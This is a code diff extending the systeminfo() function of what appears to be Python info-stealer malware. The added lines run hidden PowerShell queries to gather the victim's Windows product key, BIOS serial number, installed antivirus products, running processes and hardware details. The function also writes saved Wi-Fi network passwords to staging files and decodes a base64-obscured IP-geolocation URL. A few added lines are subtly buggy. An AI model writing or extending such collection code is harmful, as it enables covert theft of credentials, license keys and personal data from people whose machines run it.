@@ -323,11 +323,51 @@ def systeminfo():
     os.makedirs(syst_, exist_ok=True)
     sysinfooutput = os.path.join(syst_, 'System.txt')
     ipoutput = os.path.join(syst_, 'IP Info.txt')
+    procinfooutput = os.path.join(syst_, 'Processes.txt')
     ram = psutil.virtual_memory()
+    totalram = ram.total
+    availableram = ram.available
+    ramusage = ram.percent
+    usedram = ram.used
+    freeram = ram.free
+   
+    operatingsystem = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    buildtype = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).BuildType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    serialnumber = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SerialNumber", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+    
+    productkey = subprocess.check_output("powershell (Get-CimInstance -Class SoftwareLicensingService).OA3xOriginalProductKey", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    installdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).InstallDate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    bootdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).LastBootUpTime", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    refreshrate = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).MaxRefreshRate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+    
+    timezone = subprocess.check_output("powershell (Get-CimInstance Win32_TimeZone).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+    
+    model = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).Model", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    systemtype = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).SystemType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    processor = subprocess.check_output("powershell (Get-CimInstance Win32_Processor).Name", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    biosversion = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+
+    screenwidth = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentHorizontalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    screenheight = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentVerticalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+   
+    antiviruses = subprocess.check_output("powershell (Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntivirusProduct').DisplayName", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip().replace('\r\n', '\n')
+   
     information = subprocess.run('systeminfo', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
+   
     ip_info = requests.get(base64.b64decode('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==').decode('utf-8'))
+   
     sys_lines = []
     ip_lines = []
+    proc_lines = []
     if ip_info.status_code in [200, 201, 204]:
         ipinf = ip_info.json()
         ip_lines.append(f'IP Address: {ipinf.get("ip", "None")}')
@@ -336,19 +376,36 @@ def systeminfo():
         ip_lines.append(f'Coordinates: {ipinf.get("loc", "None")}')
         ip_lines.append(f'Postal: {ipinf.get("postal", "None")}')
         ip_lines.append(f'Organization: {ipinf.get("org", "None")}')
-        ip_lines.append(f'Timezone: {ipinf.get("timezone", "None")}')
-        
+
+    processes = psutil.process_iter(['pid', 'name', 'username'])
+    for proc in processes:
+        try:
+            proc_lines.append(f'PID: {proc.info["pid"]} | Name: {proc.info["name"]} | User: {proc.info["username"]}')
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            continue
+
+    information = f"Username: {username}\nPC Name: {pcname}\nOperating System: {operatingsystem}\nSystem Type: {systemtype}\nBuild Type: {buildtype}\n\nInstall Date: {installdate}\nLast Boot Time: {bootdate}\nTimezone: {timezone}\n\nModel: {model}\nProcessor: {processor}\nBIOS Version: {biosversion}\n\nSerial Number: {serialnumber}\n\nProduct Key: {productkey}"   
     sys_lines.append(information)
-    sys_lines.append('=======================================')
     sys_lines.append(f'HWID: {hwid}')
-    sys_lines.append('=======================================')
+    sys_lines.append(f'\nPath: {sys.executable}')
+
     wifiprofiles = len(wifilist)
     if wifiprofiles != 0:
-        sys_lines.append('\nWIFI:')
-        for network, password in wifilist:
-            sys_lines.append(f'{network}: {password}')
+        sys_lines.append('\nWi-Fi Networks:')
+        for i, (network, password) in enumerate(wifilist):
+            sys_lines.append(f'[{i + 1}]: {network}: {password}')
+            
+    for i, av in enumerate(antiviruses.splitlines()):
+        sys_lines.append(f'[{i + 1}]: {av}')
+
+    sys_lines.append(f'\nTotal RAM: {round((totalram / 1073741824), 2)} GB\nAvailable RAM: {round((availableram / 1073741824), 2)} GB\nRAM Usage: {usedram}%\nFree RAM: {round((freeram / 1073741824), 2)} GB\n')
+    sys_lines.append(f'Screen Resolution: {screenwidth}x{screenheight}\n')
+    sys_lines.append(f'Refresh Rate: {refreshrate}hz\n')
+    sys_lines.append(f'Antiviruses Installed:')
     write(sysinfooutput, '\n'.join(sys_lines))
     write(ipoutput, '\n'.join(ip_lines))
+    write(procinfooutput, '\n'.join(proc_lines))
+
 
 def screenshot():
     global ss_success
